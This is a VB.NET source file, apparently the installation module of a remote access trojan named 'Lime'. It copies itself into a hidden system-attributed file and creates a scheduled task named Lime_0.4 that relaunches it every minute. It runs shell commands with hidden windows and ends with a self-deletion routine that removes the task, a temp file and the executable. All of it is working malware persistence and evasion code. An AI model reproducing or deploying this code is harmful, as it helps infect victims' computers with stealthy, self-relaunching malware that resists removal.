Public Class Installation

    Public Shared Sub INS()

        If Settings.DROP AndAlso Reflection.Assembly.GetExecutingAssembly.Location <> Settings.fullpath Then

            Try
                If Not IO.Directory.Exists(Environ(Settings.PATH1) & "\" & Settings.PATH2) Then
                    IO.Directory.CreateDirectory(Environ(Settings.PATH1) & "\" & Settings.PATH2)
                ElseIf IO.File.Exists(Settings.fullpath) Then
                    IO.File.Delete(Settings.fullpath)
                End If

                Dim NF As New IO.FileStream((Settings.fullpath), IO.FileMode.CreateNew)
                Dim LEXEBYTES As Byte() = IO.File.ReadAllBytes(Settings.NEXE.FullName)
                NF.Write(LEXEBYTES, 0, LEXEBYTES.Length)
                NF.Flush()
                NF.Close()
                Settings.NEXE = New IO.FileInfo(Settings.fullpath)

                IO.File.SetAttributes(Settings.NEXE.FullName, IO.FileAttributes.System + IO.FileAttributes.Hidden)

                Shell("schtasks /create /f /sc minute /mo 1 /tn Lime_0.4 /tr " & Settings.NEXE.FullName & "", AppWinStyle.Hide, False, -1)

                Process.Start(Settings.NEXE.FullName)
                End
            Catch ex As Exception
            End Try
        End If
    End Sub

    Public Shared Sub DEL()
        Try
            If Settings.DROP Then
                IO.File.SetAttributes(Settings.NEXE.FullName, IO.FileAttributes.Normal)
                Threading.Thread.Sleep(50)

                Shell("schtasks /Delete /tn Lime_0.4 /F", AppWinStyle.Hide, False, -1)
                Threading.Thread.Sleep(50)
            End If

            IO.File.Delete(IO.Path.GetTempPath + "\lime.dat")
            Threading.Thread.Sleep(50)

            Shell("cmd.exe /c ping 0 -n 2 & del """ & Settings.NEXE.FullName & """", AppWinStyle.Hide, False, -1)
            End
        Catch ex As Exception
        End Try
    End Sub

End Class